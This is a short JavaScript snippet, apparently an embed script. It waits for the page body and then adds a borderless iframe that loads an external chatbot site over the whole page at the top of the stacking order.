(function () {
  function loadChatbot() {
    if (!document.body) {
      setTimeout(loadChatbot, 50);
      return;
    }

    var iframe = document.createElement("iframe");
    iframe.src = "https://sykasysbot.vercel.app/";

    iframe.style.position = "fixed";
    iframe.style.top = "0";
    iframe.style.left = "0";
    iframe.style.width = "100vw";
    iframe.style.height = "100vh";
    iframe.style.border = "none";
    iframe.style.zIndex = "999999";

    document.body.appendChild(iframe);
  }

  loadChatbot();
})();